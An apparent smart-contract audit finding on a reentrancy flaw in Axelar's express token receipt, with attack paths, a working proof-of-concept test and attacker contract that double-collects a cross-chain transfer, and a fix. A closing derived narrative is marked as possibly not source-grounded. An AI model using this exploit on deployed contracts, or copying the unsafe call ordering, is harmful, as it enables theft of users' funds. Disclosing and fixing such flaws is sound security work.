---
id: 18908
severity: "High"
---

# `expressReceiveToken` can be abused using reentry

## Description

```solidity
function expressReceiveTokenWithData(
    // ... params
) external {
    if (gateway.isCommandExecuted(commandId)) revert AlreadyExecuted(commandId);

    address caller = msg.sender;
    ITokenManager tokenManager = ITokenManager(getValidTokenManagerAddress(tokenId));
    IERC20 token = IERC20(tokenManager.tokenAddress());

    SafeTokenTransferFrom.safeTransferFrom(token, caller, destinationAddress, amount);

    _expressExecuteWithInterchainTokenToken(tokenId, destinationAddress, sourceChain, sourceAddress, data, amount);

    _setExpressReceiveTokenWithData(tokenId, sourceChain, sourceAddress, destinationAddress, amount, data, commandId, caller);
}
```
The issue here, is that check effect interactions are not followed.

There are two attack paths here with varying assumptions and originating parties:

**Attacker: Anyone, assuming there are third parties providing`expressReceiveTokenWithData` on demand with on-chain call:**

  1. An attacker sends a large token transfer to a chain with a public mempool.
  2. Once the attacker sees the call by Axelar to [`AxelarGateway::exectute`](https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/AxelarGateway.sol#L323) in the mempool, they front-run this call with a call to the third party providing `expressReceiveTokenWithData`.
  3. The third party (victim) transfers the tokens to the `destinationAddress` contract. Attacker is now `+amount` from this transfer.
  4. `expressExecuteWithInterchainToken` on the `destinationAddress` contract does a call to `AxelarGateway::exectute` (which can be called by anyone) to submit the report and then a reentry call to `InterchainTokenService::execute` their `commandId`. This performs the second transfer from the `TokenManager` to the `destinationAddress` (since the `_setExpressReceiveTokenWithData` has not yet been called). Attacker contract is now `+2x amount`, having received both the express transfer and the original transfer.
  5. `_setExpressReceiveTokenWithData` is set, but this `commandId` has already been executed. The victims funds have been stolen.

**AxelarGateway operator, assuming there are third parties providing`expressReceiveTokenWithData` off-chain call:**

The operator does the same large transfer as described above. The operator then holds the update to `AxelarGateway::execute` and instead, sends these instructions to their malicious `destinationContract`. When the `expressReceiveTokenWithData` is called, this malicious contract will do the same pattern as described above. Call `AxelarGateway::execute` then `InterchainTokenService::execute`.

The same attacks could work for tokens with transfer callbacks (like ERC777) with just the `expressReceiveToken` call, as well.

## Proof of Concept

Test in `tokenService.js`:
```javascript
it('attacker steals funds from express executor', async () => {
    const [token, tokenManager, tokenId] = await deployFunctions.lockUnlock(`Test Token Lock Unlock`, 'TT', 12, amount * 2);
    await token.transfer(tokenManager.address, amount);

    const expressPayer = (await ethers.getSigners())[5];
    await token.transfer(expressPayer.address, amount);
    await token.connect(expressPayer).approve(service.address, amount);

    const commandId = getRandomBytes32();
    const recipient = await deployContract(wallet, 'ExpressRecipient',
        [gateway.address,service.address,service.address.toLowerCase()]);

    const data = '0x'
    const payload = defaultAbiCoder.encode(
        ['uint256', 'bytes32', 'bytes', 'uint256', 'bytes', 'bytes'],
        [SELECTOR_SEND_TOKEN_WITH_DATA, tokenId, recipient.address, amount, service.address, data],
    );

    const params = defaultAbiCoder.encode(
        ['string', 'string', 'address', 'bytes32', 'bytes32', 'uint256'],
        [sourceChain, sourceAddress, service.address, keccak256(payload), getRandomBytes32(), 0],
    );
    await recipient.setData(params,commandId);
    
    // expressPayer express pays triggering the reentrancy
    await service.connect(expressPayer).expressReceiveTokenWithData(
            tokenId,
            sourceChain,
            service.address,
            recipient.address,
            amount,
            data,
            commandId,
        );

    // recipient has gotten both the cross chain and express transfer
    expect(await token.balanceOf(recipient.address)).to.equal(amount*2);
});
```
And `its/test/ExpressRecipient.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { MockAxelarGateway } from './MockAxelarGateway.sol';
import { IInterchainTokenExpressExecutable } from '../interfaces/IInterchainTokenExpressExecutable.sol';
import { AxelarExecutable } from '../../gmp-sdk/executable/AxelarExecutable.sol';
import { AddressBytesUtils } from '../libraries/AddressBytesUtils.sol';

contract ExpressRecipient is IInterchainTokenExpressExecutable{
    using AddressBytesUtils for address;
    
    bytes private params;
    MockAxelarGateway private gateway;
    AxelarExecutable private interchainTokenService;
    bytes32 private commandId;
    string private sourceAddress;

    constructor(MockAxelarGateway _gateway_, AxelarExecutable _its, string memory _sourceAddress) {
        gateway = _gateway_;
        interchainTokenService = _its;
        sourceAddress = _sourceAddress;
    }

    function setData(bytes memory _params, bytes32 _commandId) public {
        params = _params;
        commandId = _commandId;
    }

    function expressExecuteWithInterchainToken(
        string calldata sourceChain,
        bytes memory sadd,
        bytes calldata data,
        bytes32 tokenId,
        uint256 amount
    ) public {
        // this uses the mock call from tests but a real reporter would
        // have all data needed to make this call the proper way
        gateway.approveContractCall(params, commandId);

        bytes memory payload = abi.encode(uint256(2),tokenId,address(this).toBytes(),amount,sadd,data);
        
        // do the reentrancy and execute the transfer
        interchainTokenService.execute(commandId, sourceChain, sourceAddress, payload);
    }

    function executeWithInterchainToken(string calldata , bytes calldata , bytes calldata , bytes32 , uint256) public {}
}
```

## Recommendation

Consider using `_setExpressReceiveTokenWithData` before external calls.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a re‑entrancy flaw in the cross‑chain token receipt flow. The function that processes an express token transfer first performs an external token transfer and then calls a helper that ultimately invokes the Axelar gateway, before finally marking the command as executed with _setExpressReceiveTokenWithData. Because the state flag is set after the external calls, an attacker can trigger a second execution of the same command during the gateway call. In practice an attacker (or a malicious gateway operator) can front‑run the AxelarGateway::execute transaction that reports the cross‑chain transfer, call the third‑party contract that implements expressReceiveTokenWithData, and cause that contract to invoke the gateway again while the original command is still unmarked. The re‑entered call to InterchainTokenService::execute transfers the same amount a second time from the token manager to the destination contract. As a result the attacker receives twice the intended amount while the original sender’s funds are deducted only once, effectively stealing the excess tokens. The issue appears when any external party can invoke expressReceiveTokenWithData and when the Axelar gateway permits anyone to call its execute function, which is the case in the current deployment. It also extends to tokens with transfer callbacks such as ERC777, because the same re‑entrancy pattern applies. The bug was discovered during a Code4rena audit by constructing a test that front‑runs the gateway call and observes the double credit in the recipient contract. It is hard to notice because the re‑entrancy spans multiple contracts and occurs across a cross‑chain message, not within a single function’s call stack, and the state update that should prevent re‑execution is placed after the external interactions. The impact is high: funds can be drained from the token manager or from users who rely on the express receipt mechanism, breaking the accounting guarantees of the protocol and violating the expectation that each cross‑chain transfer is settled exactly once. From a user’s perspective the victim sees their token balance reduced unexpectedly while the attacker’s balance grows, and the protocol may appear to have “missing refunds” or “money disappearing”. To remediate, the contract should follow the check‑effects‑interactions pattern by marking the command as executed (or otherwise recording that the transfer has been processed) before any external token transfer or gateway call, and optionally add a re‑entrancy guard. This ensures that any re‑entered call will find the command already marked and abort, preserving the one‑time transfer invariant.
